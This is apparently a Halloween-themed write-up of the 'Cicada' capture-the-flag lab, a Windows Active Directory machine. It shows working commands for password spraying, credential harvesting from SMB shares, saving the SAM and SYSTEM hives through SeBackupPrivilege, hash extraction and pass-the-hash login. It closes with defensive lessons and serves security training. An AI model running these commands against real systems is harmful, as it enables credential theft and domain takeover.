# 🎃👻 Cicada Active Directory Exploitation - Halloween Edition 👻🎃

**Difficulty**: Easy  
**Classification**: Official  
**Author**: Lantern 
**Machine Author**: thebkckcicada  
**Date**: 17th January 2025    

---

## 🕷️ Synopsis 🕷️

Cicada is a spooky Windows machine that lurks in the shadows of Active Directory. This haunted domain holds secrets for those brave enough to explore its depths. In this lab, you'll uncover plaintext passwords, perform a password spray, and abuse the `seBackupPrivilege` to achieve full system compromise.  

**Skills Required**:  
- Basic Understanding of Windows  
- Basic Enumeration Skills  

**Skills Learned**:  
- Active Directory Enumeration and Privilege Escalation  
- Password Spraying (Like casting a spell with a cauldron of passwords!)  
- `SeBackupPrivilege` Abuse (Because who needs permissions on Halloween?)  
- Pass-the-Hash Attack (Ghostly authentication!)  

---

## �☠️ Enumeration: The Haunted Castle ☠️🧧

### **Nmap Scan**  
We start by scanning the haunted domain `cicada.htb` with `nmap` to uncover its dark secrets.  

```bash
nmap -sC -sV -Pn 10.129.221.30 ### Machine IP ###
```
Key Findings:

Kerberos (port 88) and LDAP (ports 389, 636, 3268, 3269) indicate an Active Directory domain.

The domain controller is CICADA-DC.cicada.htb.

🔮 Pro Tip: Add the domain to /etc/hosts to avoid getting lost in the haunted forest of DNS!

```bash
echo "machineIP cicada.htb" | sudo tee -a /etc/hosts
```
🕵️ SMB Shares: The Graveyard of Forgotten Passwords 🕵️
Anonymous Access Attempt
First, we check if the SMB shares allow anonymous access (like a ghost sneaking through walls).

```bash
crackmapexec smb cicada.htb --shares
Result: Access denied! The castle gates are locked.
```
Guest Access Attempt
Next, we try the guest account (because even ghosts need a guest pass).

```bash
crackmapexec smb cicada.htb -u 'guest' -p '' --shares
Success! The HR share is accessible. Let’s explore it like a trick-or-treater raiding a candy bowl.
```
![smb options](https://github.com/user-attachments/assets/a60fcd7f-4fee-4fc8-a9cb-62b2c31abbcc)


```bash
smbclient //cicada.htb/HR
Inside, we find a file: Notice from HR.txt. Download it and uncover a default password:
```
![HR notice](https://github.com/user-attachments/assets/26b7013c-7d03-40fb-91de-e38b462f24a1)

![HR text](https://github.com/user-attachments/assets/4911ec8c-a7ed-4d59-b9ae-94fe229c762b)


Dear new hire!  
Your default password is: **🎃🎃🎃🎃🎃🎃🎃**  
🎃 Halloween Twist: This password is like a cursed artifact—once found, it grants power!

👻 Lookupsid: Summoning the Spirits of the Domain 👻
We use Impacket's lookupsid to enumerate domain users (like calling forth spirits from the underworld).

```bash
impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass
Key Users Found:
```
Administrator (The Lich King of the domain)

michael.wrightson (A careless warlock)

david.orelious (Who left his password in his tombstone description)

emily.oscars (A witch with a backup spellbook)

Extract users to users.txt:

![users](https://github.com/user-attachments/assets/592ad258-2e62-45dd-974a-bead8f22127e)


```bash
impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass | grep 'SidTypeUser' | sed 's/.*\\.\(.*\) (SidTypeUser)/\1/' > users.txt
🎃 Password Spraying: The Curse of the Default Password 🎃
We unleash a password spray attack with the default password (like a zombie horde attacking a village).
```
```bash
crackmapexec smb cicada.htb -u users.txt -p 'cicada$M6Corpb*@Lp#nZp18'
```
Result: michael.wrightson is still using the default password!

🕵️ Enumerating Domain Users: The Witch’s Brew 🕵️
With michael.wrightson’s credentials, we uncover more secrets:

```bash
crackmapexec smb cicada.htb -u michael.wrightson -p 'password found' --users
```
Boo! david.orelious left his password in his AD description:

desc: Just in case I forget my password is **🎃🎃🎃🎃🎃🎃**
🧙 Foothold: The Witch’s Spellbook 🧙
Using david.orelious’s credentials, we access the DEV share and find Backup_script.ps1.

```bash
smbclient //cicada.htb/DEV -U 'david.password found'
Inside the script, we find another set of cursed credentials:
```

```powershell
$username = "emily.oscars"  
$password = "password"
```

Great! Now we can do a little snooping and find the first user flag.

![user flag](https://github.com/user-attachments/assets/ef981578-f5f9-485b-b4a5-b58764444d83)


🧟 Privilege Escalation: The Lich King’s Crown 🧟
Step 1: Access as Emily
We use Evil-WinRM to log in as emily.oscars:

```bash
evil-winrm -u emily.oscars -p 'password' -i cicada.htb
```

Step 2: Check Privileges
Emily has SeBackupPrivilege—a ghostly power to bypass file permissions!

```powershell
whoami /priv
```

Step 3: Dump SAM and SYSTEM Hives
We steal the domain’s soul (hashes) by dumping the SAM and SYSTEM hives:

```powershell
reg save hklm\sam sam  
reg save hklm\system system
```
  
Download the files to our local machine:

```powershell
download sam  
download system
```
Step 4: Extract Hashes with Impacket
We use secretsdump to extract the Administrator’s NTLM hash:

```bash
impacket-secretsdump -sam sam -system system local
```

Output:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:🎃🎃🎃🎃🎃🎃🎃:::
Step 5: Pass-the-Hash Attack
We become the Lich King by logging in as Administrator with the hash:

```bash
evil-winrm -u Administrator -H hash -i cicada.htb
```

🏴‍☠️ Conclusion: The Haunting is Complete 🏴‍☠️
We’ve conquered the Cicada domain, from uncovering plaintext passwords to abusing backup privileges.

Lessons Learned:

Never leave passwords in descriptions (or cursed scrolls).

Default passwords are like open graves—someone will fall in.

Backup privileges can turn a mere mortal into a domain admin.

Now go forth, and haunt other machines! 🎃👻

Happy Hacking and Happy Halloween! 🧙‍♂️🦇









